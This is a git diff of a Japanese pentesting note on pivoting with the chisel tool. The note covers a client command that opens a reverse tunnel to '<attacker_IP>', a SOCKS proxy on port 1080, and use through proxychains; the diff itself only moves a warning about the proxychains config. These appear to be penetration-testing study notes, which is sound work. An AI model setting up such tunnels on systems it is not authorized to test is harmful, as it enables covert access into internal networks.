@@ -70,9 +70,6 @@ chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<des
 - 一方で、ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
 - `> /dev/null 2>&1 &`：[[スクリプト・コマンド・シェル操作#シェル(`sh`系)の特殊記号一覧表]]
 
->[!WARNING]注意
->socksを使うときは、`/etc/proxychains4.con`に`socks5 127.0.0.1 1080`の設定を入れること
-
 6. 成功すればchisel server(攻撃者マシン)に以下のように表示される
 ```
 2025/09/27 12:41:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
@@ -83,6 +80,9 @@ chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<des
 7. 目的の操作をする
 	- Proxychainsを使ってコマンドを実行する場合：[[Port Redirection & SSH Port Forwarding#SSH Remote Dynamic Port Forwarding]]のステップ5以降
 	- SOCK経由のSSHアクセスの場合：[[22 - SSH#SSHをSOCKSプロキシ経由で動かす]]
+
+>[!WARNING] 注意
+>socksを使うときは、`/etc/proxychains4.con`に`socks5 127.0.0.1 1080`の設定を入れること
 
 ---
 ---
